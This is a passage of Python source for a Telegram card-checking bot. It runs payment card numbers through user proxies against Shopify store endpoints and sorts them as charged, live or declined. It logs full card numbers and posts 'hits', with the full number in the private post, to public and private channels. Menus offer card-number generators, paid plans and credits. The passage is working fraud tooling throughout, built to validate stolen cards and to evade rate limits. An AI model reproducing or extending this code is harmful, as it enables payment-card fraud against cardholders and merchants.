                "live": False, "charged": False, "_no_site": True}
    await acquire_site_slot(site)

    url = build_api_url(ep, cc, site, proxy or "")
    start = asyncio.get_event_loop().time()

    try:
        connector = aiohttp.TCPConnector(force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                status_code = r.status
                text = await r.text()
    except (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError) as e:
        return {"error": f"PROXY_ERR: {e}", "live": False, "charged": False,
                "_proxy_error": True, "proxy": proxy, "_site": site}
    except (asyncio.TimeoutError, aiohttp.ServerTimeoutError):
        return {"error": "PROXY_TIMEOUT", "live": False, "charged": False,
                "_proxy_error": True, "proxy": proxy, "_site": site}
    except (aiohttp.ClientConnectorError, aiohttp.ClientConnectorSSLError,
            aiohttp.ClientOSError, aiohttp.ClientConnectionError) as e:
        return {"error": f"PROXY_CONN: {e}", "live": False, "charged": False,
                "_proxy_error": True, "proxy": proxy, "_site": site}
    except Exception as e:
        return {"error": str(e), "live": False, "charged": False, "_site": site}

    elapsed = asyncio.get_event_loop().time() - start

    if status_code == 429:
        _bench_site(site, 120)
        return {"error": "RATE_LIMIT_429", "live": False, "charged": False,
                "_rate_limited": True, "_site": site}

    try:
        raw = json.loads(text)
    except Exception:
        raw = {"raw_text": text[:1000]}

    if not isinstance(raw, dict):
        return {"error": "Invalid response format", "raw": raw, "live": False,
                "charged": False, "_site": site}

    result = _normalize_response(raw, elapsed)
    result["_site"] = site
    if result.get("classification") == "SITE_ERROR":
        result["_site_error"] = True
        result["_site_error_msg"] = result.get("message", "")
    return result

def _normalize_response(raw: dict, elapsed: float = 0) -> Dict[str, Any]:
    classification, message = classify_response(raw)
    live = classification in ("CHARGED", "APPROVED", "APPROVED_NSF", "APPROVED_CCN")
    charged = classification == "CHARGED"

    def _pick(*keys, default=None):
        for src in (raw, raw.get("data") if isinstance(raw.get("data"), dict) else None):
            if not isinstance(src, dict): continue
            for k in keys:
                if k in src and src[k] is not None:
                    return src[k]
        return default

    amount = _pick("amount", "Amount", "price", "Price", default=0)
    try: amount = float(amount)
    except Exception: amount = 0.0
    currency = _pick("currency", "Currency", default="USD")
    gateway  = _pick("gateway", "Gateway", "gateway_name", default="Shopify")

    return {
        "response": message or classification,
        "message": message,
        "classification": classification,
        "status": _pick("status", "Status", default=""),
        "live": live,
        "charged": charged,
        "amount": amount,
        "currency": currency,
        "gateway": gateway,
        "time": f"{elapsed:.2f}s",
        "raw": raw,
        "_raw_ok": True,
        "_elapsed": elapsed,
    }

def is_hit(res):
    if res.get("error"): return False
    return bool(res.get("live") or res.get("charged"))

def is_charged(res):
    return bool(res.get("charged"))

# ══════════════════════════════════════════════════════════════════════════════
# AUTO-REMOVAL + OWNER ALERTS
# ══════════════════════════════════════════════════════════════════════════════
async def _notify_owner(bot, text: str):
    try:
        await bot.send_message(PRIMARY_ADMIN_ID, text, parse_mode=None, disable_web_page_preview=True)
    except Exception as e:
        log.warning(f"notify owner: {e}")

async def _handle_site_error(bot, site: str, message: str):
    if not site: return
    try:
        remove_site(site)
    except Exception as e:
        log.warning(f"remove_site: {e}")
    await _notify_owner(
        bot,
        f"[SITE REMOVED]\n"
        f"Site: {site}\n"
        f"Error: {message[:500]}\n"
        f"Removed from sites.txt and DB."
    )

async def _handle_proxy_error(bot, uid: int, proxy: str, error: str):
    if not proxy: return
    if not await _is_proxy_dead(proxy): return
    try:
        with db() as c:
            c.execute("DELETE FROM user_proxies WHERE proxy=?", (proxy,))
        _remove_from_proxy_pool(proxy)
    except Exception as e:
        log.warning(f"remove dead proxy: {e}")
    await _notify_owner(
        bot,
        f"[DEAD PROXY REMOVED]\n"
        f"Proxy: {proxy}\n"
        f"Error: {str(error)[:300]}\n"
        f"Removed from all user lists and proxy.txt."
    )

# ══════════════════════════════════════════════════════════════════════════════
# HIT POSTING
# ══════════════════════════════════════════════════════════════════════════════
async def post_hit_public(bot, cc, data, charged, username):
    chat_id = get_setting("auto_post_chat", "")
    if not chat_id: return
    brand = get_branding()
    title = f"{pe('check')} <b>{sc('CHARGED · ORDER PAID')}</b>" if charged else f"{pe('online')} <b>{sc('CARD LIVE')}</b>"
    resp_label = sc(str(data.get('response', 'UNKNOWN')).upper())
    text = (
        f"{title}\n<blockquote>"
        f"{pe('gem')}  <b>{sc('Resp')}</b>  ·  {esc(resp_label)}\n"
        f"{pe('shop')}  <b>{sc('Amount')}</b>  ·  <b>${data.get('amount', 0):.2f} {esc(data.get('currency','USD'))}</b>\n"
        f"{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(data.get('gateway','Shopify'))}\n"
        f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  <code>{esc(data.get('time','0s'))}</code>"
        f"</blockquote>\n"
        f"<i>{sc('Dev')} {esc(brand['dev_username'])} · "
        f"{sc('Network')} {esc(brand['network_username'])}</i>"
    )
    try:
        await bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.HTML)
    except Exception as e:
        log.warning(f"post_hit_public: {e}")

async def post_hit_private(bot, cc, data, charged, uid, username):
    chat_id = get_setting("hit_log_channel", "")
    if not chat_id or chat_id == get_setting("auto_post_chat", ""): return
    title = f"{pe('check')} <b>{sc('CHARGED CARD')}</b> {pe('warn_red')}" if charged else f"{pe('online')} <b>{sc('LIVE HIT')}</b>"
    text = (
        f"{title}\n<blockquote>"
        f"{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${data.get('amount', 0):.2f} {esc(data.get('currency','USD'))}</b>\n"
        f"{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(data.get('response', 'N/A'))}\n"
        f"{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(data.get('gateway','Shopify'))}\n"
        f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  <code>{esc(data.get('time','0s'))}</code>\n"
        f"{pe('star')}  <b>{sc('CC')}</b>  ·  <code>{esc(cc)}</code>"
        f"</blockquote>"
    )
    try:
        await bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.HTML,
                                disable_notification=True)
    except Exception as e:
        log.warning(f"post_hit_private: {e}")

# ══════════════════════════════════════════════════════════════════════════════
# HEALTH LOOP
# ══════════════════════════════════════════════════════════════════════════════
async def _check_site_ok(session, site):
    ep = get_active_endpoint()
    if not ep: return False
    url = build_api_url(ep, TEST_CARD, site, "")
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200: return False
            txt = await r.text()
            try: data = json.loads(txt)
            except Exception: return False
            if isinstance(data, dict):
                cls, _ = classify_response(data)
                return cls != "SITE_ERROR"
            return False
    except Exception:
        return False

async def site_health_loop(bot):
    await asyncio.sleep(30)
    while True:
        try:
            health = {}
            sites = get_sites()
            if sites:
                async with aiohttp.ClientSession() as session:
                    for site in sites:
                        health[site] = "ok" if await _check_site_ok(session, site) else "down"
                try:
                    async with _get_write_lock():
                        set_setting("site_health", json.dumps(health))
                except Exception as e:
                    log.warning(f"health save: {e}")
                for site, st in health.items():
                    if st == "ok":
                        _site_cooldown_until.pop(site, None)
                        _site_fail_count[site] = 0
        except Exception as e:
            log.warning(f"health loop: {e}")
        await asyncio.sleep(300)

# ══════════════════════════════════════════════════════════════════════════════
# UI HELPERS
# ══════════════════════════════════════════════════════════════════════════════
BAR_GRADIENT = ["🟥", "🟧", "🟨", "🟩"]

def make_bar(pct: int, width: int = 12) -> str:
    pct = max(0, min(100, pct))
    filled = int(round(width * pct / 100))
    return "▰" * filled + "▱" * (width - filled)

def make_fancy_bar(pct: int) -> str:
    pct = max(0, min(100, pct))
    cells = 10
    filled = int(round(cells * pct / 100))
    out = []
    for i in range(cells):
        if i < filled:
            idx = min(3, i * 4 // cells)
            out.append(BAR_GRADIENT[idx])
        else:
            out.append("⬛")
    return "".join(out)

def spinner_frame(i: int) -> str:
    return ["◐", "◓", "◑", "◒"][i % 4]

def _fmt_eta(s):
    if s < 60: return f"{int(s)}s"
    m, sec = divmod(int(s), 60)
    return f"{m}m {sec}s"

# ══════════════════════════════════════════════════════════════════════════════
# MENUS
# ══════════════════════════════════════════════════════════════════════════════
def main_menu_kb(user_id=0):
    kb = [
        [pbtn(sc("Checker"), icon="shop", callback_data="menu:check"),
         pbtn(sc("Tools"), icon="tools", callback_data="menu:tools")],
        [pbtn(sc("Premium"), icon="gem", color="success", callback_data="menu:shop"),
         pbtn(sc("Proxy"), icon="link", callback_data="menu:proxy")],
        [pbtn(sc("Saved"), icon="book", callback_data="menu:saved"),
         pbtn(sc("History"), icon="docs", callback_data="menu:history")],
        [pbtn(sc("Account"), icon="user", callback_data="menu:account"),
         pbtn(sc("Stats"), icon="chart", callback_data="menu:stats")],
        [pbtn(sc("Refer"), icon="heart", color="success", callback_data="menu:refer"),
         pbtn(sc("Streak"), icon="online", color="success", callback_data="menu:streak")],
        [pbtn(sc("Trial"), icon="unlock", color="success", callback_data="menu:trial"),
         pbtn(sc("Close"), icon="cross1", color="danger", callback_data="menu:close")],
    ]
    public_ch = get_setting("public_channel", "")
    if public_ch:
        kb.append([pbtn(sc("Channel"), icon="chat", color="primary", url=channel_url(public_ch))])
    if is_admin(user_id):
        kb.insert(0, [pbtn(sc("Admin Panel"), icon="settings", callback_data="menu:admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="menu:main")]])

def tools_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("VISA Gen"), icon="gem", callback_data="gen:4")],
        [pbtn(sc("MASTER Gen"), icon="gem2", callback_data="gen:5")],
        [pbtn(sc("AMEX Gen"), icon="gem3", callback_data="gen:34")],
        [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
    ])

def shop_kb():
    rows = [[pbtn(f"{p['label']} · {p['stars']}⭐", icon="star", color="success",
                  callback_data=f"buy:{k}")] for k, p in STAR_PRODUCTS.items()]
    rows.append([pbtn(sc("Back"), icon="back", callback_data="menu:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def proxy_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
        [pbtn(sc("Revalidate All"), icon="refresh", callback_data="proxy:check")],
        [pbtn(sc("List Proxies"), icon="docs", callback_data="proxy:list")],
        [pbtn(sc("Clear All"), icon="trash", color="danger", callback_data="proxy:clear")],
        [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
    ])

def admin_main_kb(uid):
    owner = is_owner(uid)
    maint = get_setting("maintenance") == "1"
    log_ch = get_setting("hit_log_channel", "")
    auto_post = get_setting("auto_post_chat", "")
    public_ch = get_setting("public_channel", "")
    sites = get_sites()
    forces = force_channels_list()
    eps = load_endpoints()
    kb = []
    if owner:
        kb.append([pbtn(sc("Edit Branding"), icon="pen", color="primary", callback_data="admin:branding")])
    kb.append([pbtn(f"{sc('Maintenance')}: {'ON' if maint else 'OFF'}",
                    icon="warn_red" if maint else "online", callback_data="admin:toggle_maint")])
    if owner:
        kb.append([pbtn(f"{sc('APIs')} ({len(eps['endpoints'])}) · #{eps['active_idx']+1}",
                        icon="link", color="success", callback_data="admin:apis")])
        kb.append([pbtn(f"{sc('Force Channels')} ({len(forces)})", icon="unlock",
                        color="primary", callback_data="admin:force_list")])
        kb.append([pbtn(f"{sc('Sites')} ({len(sites)})", icon="shop", callback_data="admin:sites"),
                   pbtn(sc("Site Health"), icon="online", callback_data="menu:health")])
        kb.append([pbtn(sc("Refresh Health"), icon="refresh", callback_data="admin:health_refresh")])
        kb.append([pbtn(f"{sc('Public Channel')}: {str(public_ch)[:14] or '—'}",
                        icon="chat", callback_data="admin:set_public_channel")])
        kb.append([pbtn(f"{sc('Public Log GC')}: {str(auto_post)[:14] or '—'}",
                        icon="chat2", callback_data="admin:set_autopost")])
        kb.append([pbtn(f"{sc('Private GC')}: {str(log_ch)[:14] or '—'}",
                        icon="lock" if "lock" in EMOJI else "unlock", callback_data="admin:set_hitlog")])
    kb.append([pbtn(sc("Users List"), icon="user", callback_data="admin:users:0"),
               pbtn(sc("Banned"), icon="warn", color="danger", callback_data="admin:banned")])
    kb.append([pbtn(sc("Recent Checks"), icon="docs", callback_data="admin:recent"),
               pbtn(sc("Top Checkers"), icon="chart", callback_data="admin:top")])
    kb.append([pbtn(sc("Generate Code"), icon="add", color="success", callback_data="admin:gen_code")])
    kb.append([pbtn(sc("User Lookup"), icon="user", callback_data="admin:user_lookup")])
    kb.append([pbtn(sc("Broadcast"), icon="bell", callback_data="admin:broadcast"),
               pbtn(sc("Stats"), icon="chart", callback_data="admin:stats")])
    if owner:
        kb.append([pbtn(sc("Give Plan"), icon="gem", color="success", callback_data="admin:give_plan"),
                   pbtn(sc("Give Pts"), icon="gem2", color="success", callback_data="admin:give_points")])
        kb.append([pbtn(sc("Ban/Unban"), icon="warn", color="danger", callback_data="admin:ban")])
        kb.append([pbtn(sc("Plan Settings"), icon="settings", color="success", callback_data="admin:plan_settings")])
        kb.append([pbtn(sc("Admin Management"), icon="user", color="primary", callback_data="admin:manage_admins")])
        kb.append([pbtn(sc("Upload DB"), icon="add", color="primary", callback_data="admin:upload_db"),
                   pbtn(sc("Clear Cache"), icon="trash", color="danger", callback_data="admin:clear_cache")])
    kb.append([pbtn(sc("Close"), icon="cross1", color="danger", callback_data="admin:close")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def force_list_kb():
    channels = force_channels_list()
    rows = []
    for ch in channels:
        icon = "check" if ch["enabled"] else "warn"
        label = f"{ch['title'][:30] or ch['chat_id']}"
        rows.append([pbtn(label, icon=icon, callback_data=f"admin:force_view:{ch['chat_id']}")])
    rows.append([pbtn(sc("Add Channel"), icon="add", color="success", callback_data="admin:force_add")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def apis_kb():
    data = load_endpoints()
    rows = []
    for i, ep in enumerate(data["endpoints"]):
        mark = "●" if i == data["active_idx"] else "○"
        key_part = " · KEY" if ep.get("key") else ""
        label = f"{mark} {i+1}. {ep['url'][:38]}{key_part}"
        rows.append([pbtn(label, icon="link",
                          color="success" if i == data["active_idx"] else "primary",
                          callback_data=f"api:switch:{i}")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def sites_kb():
    try:
        health = json.loads(get_setting("site_health", "{}") or "{}")
    except Exception:
        health = {}
    sites = get_sites()
    rows = []
    for i, s in enumerate(sites):
        fails = _site_fail_count.get(s, 0)
        benched = _is_site_benched(s)
        h = health.get(s, "unknown")
        icon = "warn_red" if (benched or h == "down") else ("check" if h == "ok" else "diamond2")
        label = s.replace('.myshopify.com', '')
        if fails: label += f" ⚠{fails}"
        if benched: label += " · BENCHED"
        rows.append([pbtn(label[:40], icon=icon, callback_data=f"admin:site_view:{i}")])
    rows.append([pbtn(sc("Add Site"), icon="add", color="success", callback_data="admin:add_site")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(page=0, per_page=10):
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        rows = c.execute("SELECT uid, username, plan FROM users ORDER BY uid LIMIT ? OFFSET ?",
                          (per_page, page * per_page)).fetchall()
    kb = []
    for r in rows:
        kb.append([pbtn(f"{r['uid']} · {r['username'] or 'anon'} · {r['plan']}",
                        icon="user", callback_data=f"admin:user_view:{r['uid']}")])
    nav = []
    if page > 0:
        nav.append(pbtn(sc("Prev"), icon="back", callback_data=f"admin:users:{page-1}"))
    if (page+1)*per_page < total:
        nav.append(pbtn(sc("Next"), icon="forward", callback_data=f"admin:users:{page+1}"))
    if nav: kb.append(nav)
    kb.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=kb), total, page

def branding_kb():
    b = get_branding()
    rows = [
        [pbtn(f"Bot Name: {b['bot_name'][:20]}", icon="pen", callback_data="admin:brand_edit:bot_name")],
        [pbtn(f"Dev Name: {b['dev_name'][:18]}", icon="pen", callback_data="admin:brand_edit:dev_name")],
        [pbtn(f"Dev Username: {b['dev_username']}", icon="pen", callback_data="admin:brand_edit:dev_username")],
        [pbtn(f"Network Name: {b['network_name'][:18]}", icon="pen", callback_data="admin:brand_edit:network_name")],
        [pbtn(f"Network Username: {b['network_username']}", icon="pen", callback_data="admin:brand_edit:network_username")],
        [pbtn(sc("Back"), icon="back", callback_data="admin:main")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_kb():
    admins = list_extra_admins()
    rows = []
    for a in admins:
        rows.append([pbtn(f"{a['uid']} · {a['username'] or 'anon'}",
                          icon="user", callback_data=f"admin:view_admin:{a['uid']}")])
    rows.append([pbtn(sc("Add Admin"), icon="add", color="success", callback_data="admin:add_admin")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ══════════════════════════════════════════════════════════════════════════════
# KEYS
# ══════════════════════════════════════════════════════════════════════════════
_keys_cache: Optional[dict] = None

def load_keys(force: bool = False) -> dict:
    global _keys_cache
    if _keys_cache is not None and not force:
        return _keys_cache
    if not os.path.exists(KEYS_FILE):
        _keys_cache = {"keys": []}
        _save_keys_raw(_keys_cache)
        return _keys_cache
    try:
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not isinstance(data.get("keys"), list):
            data = {"keys": []}
        _keys_cache = data
        return data
    except Exception:
        _keys_cache = {"keys": []}
        return _keys_cache

def _save_keys_raw(data: dict):
    try:
        with open(KEYS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        log.warning(f"keys save: {e}")

def save_keys(data: dict):
    global _keys_cache
    _keys_cache = data
    _save_keys_raw(data)

def generate_keys(count: int) -> List[str]:
    data = load_keys(force=True)
    existing = {k.get("key") for k in data["keys"]}
    chars = string.ascii_uppercase + string.digits
    out = []
    now = time.time()
    for _ in range(count):
        for _attempt in range(10):
            suffix = "".join(secrets.choice(chars) for _ in range(4))
            key = f"{KEY_PREFIX}-{suffix}"
            if key not in existing: break
        existing.add(key)
        data["keys"].append({"key": key, "used": False, "created_at": now,
                             "used_by": None, "used_at": None})
        out.append(key)
    save_keys(data)
    return out

def redeem_key(key: str, uid: int) -> str:
    key = key.strip().upper()
    data = load_keys(force=True)
    for k in data["keys"]:
        if k.get("key", "").upper() == key:
            if k.get("used"): return "used"
            k["used"] = True
            k["used_by"] = uid
            k["used_at"] = time.time()
            save_keys(data)
            try:
                with open(PREMIUM_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{uid}\n")
            except Exception as e:
                log.warning(f"premium.txt: {e}")
            upgrade_user(uid, "unlimited", 0)
            return "ok"
    return "invalid"

# ══════════════════════════════════════════════════════════════════════════════
# DAILY / QUOTA
# ══════════════════════════════════════════════════════════════════════════════
user_cooldowns = {}
CHECK_COOLDOWN_SEC = 3

def refresh_daily(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date, last_check_date FROM users WHERE uid=?", (uid,)).fetchone()
        if not row: return
        if row["last_credit_date"] != today:
            c.execute("UPDATE users SET credits=credits+50, last_credit_date=? WHERE uid=?", (today, uid))
        if row["last_check_date"] != today:
            c.execute("UPDATE users SET daily_checks=0, last_check_date=? WHERE uid=?", (today, uid))

def consume_quota(uid):
    ensure_user(uid)
    refresh_daily(uid)
    u = get_user(uid)
    if not u: return False, "limit"
    plan_key = u["plan"] if u["plan"] in PLANS else "free"
    if u["daily_checks"] < PLANS[plan_key]["limit"]:
        with db() as c:
            c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "daily"
    if u["credits"] >= 2:
        with db() as c:
            c.execute("UPDATE users SET credits=credits-2, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "credits"
    return False, "limit"

def apply_streak(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    yesterday = (datetime.now(timezone.utc).date() - timedelta(days=1)).isoformat()
    result = {"streak": 0, "reward": None, "credits": 0, "new_day": False}
    try:
        with db() as c:
            row = c.execute("SELECT streak, last_streak_date, credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not row: return result
            streak = row["streak"] or 0
            last_date = row["last_streak_date"] or ""
            credits = row["credits"] or 0
            if last_date == today:
                result.update(streak=streak, credits=credits); return result
            streak = (streak + 1) if last_date == yesterday else 1
            reward = None
            if streak == 7:
                credits += 50; reward = "+50 credits (7-day streak)"
            elif streak == 30:
                upgrade_user(uid, "pro", 1); reward = "1-day Pro trial (30-day streak)"
            c.execute("UPDATE users SET streak=?, last_streak_date=?, credits=? WHERE uid=?",
                      (streak, today, credits, uid))
            result.update(streak=streak, reward=reward, credits=credits, new_day=True)
    except Exception as e:
        log.warning(f"apply_streak: {e}")
    return result

# ══════════════════════════════════════════════════════════════════════════════
# LOADING ANIMATION
# ══════════════════════════════════════════════════════════════════════════════
LOADING_FRAMES = [
    f"{pe('loading')} <b>{sc('Connecting')}</b>",
    f"{pe('refresh')} <b>{sc('Checking')}</b>",
    f"{pe('hourglass')} <b>{sc('Processing')}</b>",
    f"{pe('diamond')} <b>{sc('Analyzing')}</b>",
]

async def animate_loading(msg, cc_line, stop_event):
    i = 0
    while not stop_event.is_set():
        try:
            await msg.edit_text(
                f"{spinner_frame(i)} {LOADING_FRAMES[i % len(LOADING_FRAMES)]}\n"
                f"<blockquote><code>{cc_line}</code></blockquote>", parse_mode="HTML")
        except Exception: pass
        i += 1
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=1.2)
        except asyncio.TimeoutError: pass

# ══════════════════════════════════════════════════════════════════════════════
# RESULT FORMAT
# ══════════════════════════════════════════════════════════════════════════════
def format_result(cc, res, bin_info=None):
    brand = get_branding()
    if "error" in res:
        err = str(res['error'])
        tip = (f"<blockquote>{pe('warn')} <b>{sc('API failed')}</b>\n"
               f"{pe('link')} {sc('Add proxy')}: <code>/proxy</code></blockquote>"
               ) if "ALL" in err.upper() else f"<blockquote>{pe('warn_red')} {esc(err)}</blockquote>"
        return f"{pe('cross1')} <b>{sc('Check Failed')}</b>\n<blockquote>{pe('star')} <code>{cc}</code></blockquote>\n{tip}"

    hit = is_hit(res)
    charged = is_charged(res)
    resp_msg = res.get("response", "Unknown")
    amount = res.get("amount", 0.0)
    currency = res.get("currency", "USD")

    title = (f"{pe('check')} <b>{sc('CHARGED · ORDER PAID')}</b>" if charged
             else f"{pe('online')} <b>{sc('CARD IS LIVE')}</b>" if hit
             else f"{pe('cross2')} <b>{sc('DECLINED')}</b>")

    bin_line = ""
    if bin_info and "error" not in bin_info:
        country = bin_info.get("Country", {}) or {}
        flag = country_flag(country.get("Code", ""))
        bin_line = (f"{pe('shop')}  <b>{sc('Bank')}</b>  ·  {esc(bin_info.get('Issuer', 'N/A'))}\n"
                    f"{flag}  <b>{sc('Country')}</b>  ·  {esc(country.get('Name', 'N/A'))}\n")

    return (
        f"{title}\n<blockquote>{brand_pe(cc)}  <code>{cc}</code></blockquote>\n<blockquote>"
        f"{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(resp_msg)}\n"
        f"{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${amount:.2f} {esc(currency)}</b>\n"
        f"{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(res.get('gateway', 'Shopify'))}\n"
        f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  <code>{esc(res.get('time', '0s'))}</code>\n"
        f"{bin_line}</blockquote>\n"
        f"<i>{sc('Dev')} {esc(brand['dev_username'])} · "
        f"{sc('Network')} {esc(brand['network_username'])}</i>"
    )

# ══════════════════════════════════════════════════════════════════════════════
# SINGLE CHECK
# ══════════════════════════════════════════════════════════════════════════════
async def process_check_logic(msg, cc_line, bot, uid=None, username=None):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""

    user = get_user_or_create(uid, username)
    if not user:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Error')}</b>. {sc('Try')} /start.", parse_mode="HTML")
    if user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('You are banned')}</b>", parse_mode="HTML")

    user_proxies = user_proxy_list(uid)
    if not user_proxies:
        return await msg.answer(
            f"{pe('cross1')} <b>{sc('Proxy Required')}</b>\n"
            f"<blockquote>{pe('link')} {sc('Add proxy first')}: /proxy</blockquote>",
            parse_mode="HTML")

    now = time.time()
    if uid in user_cooldowns and now - user_cooldowns[uid] < CHECK_COOLDOWN_SEC:
        wait = CHECK_COOLDOWN_SEC - int(now - user_cooldowns[uid])
        return await msg.answer(f"{pe('stop')} <b>{sc('Slow down')}</b>. {sc('Try in')} {wait}s.", parse_mode="HTML")
    user_cooldowns[uid] = now

    ok, _ = consume_quota(uid)
    if not ok:
        u = get_user(uid)
        return await msg.answer(
            f"{pe('unlock')} <b>{sc('Daily Limit Reached')}</b>\n"
            f"<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[u['plan']]['name']}</b>\n"
            f"{pe('star')} {sc('Credits')}: <b>{u['credits']}</b> · {sc('Need')} 2</blockquote>\n"
            f"{pe('shop')} <b>{sc('Upgrade')}</b>: /shop", parse_mode="HTML")

    proxy = random.choice(user_proxies)

    loading = await msg.answer(
        f"{spinner_frame(0)} {LOADING_FRAMES[0]}\n<blockquote><code>{cc_line}</code></blockquote>",
        parse_mode="HTML")
    stop_ev = asyncio.Event()
    anim_task = asyncio.create_task(animate_loading(loading, cc_line, stop_ev))

    try:
        res = await call_api(cc_line, proxy=proxy)
    except Exception as e:
        res = {"error": str(e), "live": False, "charged": False}

    stop_ev.set()
    try: await anim_task
    except Exception: pass

    if res.get("_site_error"):
        asyncio.create_task(_handle_site_error(bot, res.get("_site", ""), res.get("_site_error_msg", "")))
    if res.get("_proxy_error"):
        asyncio.create_task(_handle_proxy_error(bot, uid, res.get("proxy", ""), res.get("error", "")))

    bin_info = None
    if "error" not in res:
        try: bin_info = await lookup_bin(cc_line.split("|")[0][:6])
        except Exception: pass
        try:
            async with _get_write_lock():
                with db() as c:
                    c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)",
                              (uid, cc_line, res.get("response", ""),
                               "HIT" if is_hit(res) else "DECLINED",
                               res.get("gateway", "shopify"),
                               datetime.now(timezone.utc).isoformat()))
                    if is_hit(res):
                        c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
        except Exception as e:
            log.warning(f"check log: {e}")
        if is_hit(res):
            asyncio.create_task(post_hit_public(bot, cc_line, res, is_charged(res), username))
            asyncio.create_task(post_hit_private(bot, cc_line, res, is_charged(res), uid=uid, username=username))

    text = format_result(cc_line, res, bin_info)
    btns = [pbtn(sc("Recheck"), icon="refresh", callback_data=f"recheck:{cc_line}")]
    if "error" not in res and is_hit(res):
        btns.append(pbtn(sc("Save"), icon="book", color="success", callback_data=f"save:{cc_line}"))
    kb = InlineKeyboardMarkup(inline_keyboard=[btns])
    photo = IMG_HIT if ("error" not in res and is_hit(res)) else IMG_DECLINE

    try: await loading.delete()
    except Exception: pass
    try:
        await msg.answer_photo(photo=photo, caption=text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        try: await msg.answer(text, parse_mode="HTML", reply_markup=kb)
        except Exception: pass

# ══════════════════════════════════════════════════════════════════════════════
# MASS CHECK
# ══════════════════════════════════════════════════════════════════════════════
CONCURRENCY_BY_PLAN = {"free": 1, "pro": 2, "premium": 2, "max": 3, "unlimited": 4}

async def run_mass_check(msg, cards, bot, bypass_quota=False, uid=None, username=None):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""

    user = get_user_or_create(uid, username)
    if not user or user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")

    if not bypass_quota:
        if not user_proxy_list(uid):
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
                [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
            ])
            return await msg.answer(
                f"{pe('cross1')} <b>{sc('Access Denied')}</b>\n"
                f"<blockquote>{pe('link')} <b>{sc('Proxy Required')}</b>\n"
                f"/msh {sc('ke liye pehle proxy add karo')}.</blockquote>",
                parse_mode="HTML", reply_markup=kb)

    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c.strip())
        if n and n not in seen:
            normalized.append(n); seen.add(n)
    valid = normalized
    if not valid:
        return await msg.answer(f"{pe('warn')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")

    if not bypass_quota:
        refreshed = get_user(uid)
        plan_key = refreshed["plan"] if refreshed["plan"] in PLANS else "free"
        batch_limit = PLANS[plan_key].get("mass_limit", 100)
        if len(valid) > batch_limit:
            return await msg.answer(
                f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n"
                f"<blockquote>{pe('gem')} {sc('Your Plan')}: <b>{PLANS[plan_key]['name']}</b>\n"
                f"{pe('shop')} {sc('Max per batch')}: <b>{batch_limit} {sc('cards')}</b>\n"
                f"{pe('warn')} {sc('You sent')}: <b>{len(valid)} {sc('cards')}</b></blockquote>\n"
                f"{pe('diamond')} <b>{sc('Upgrade')}:</b> /shop", parse_mode="HTML")
        remaining = max(0, PLANS[plan_key]["limit"] - refreshed["daily_checks"])
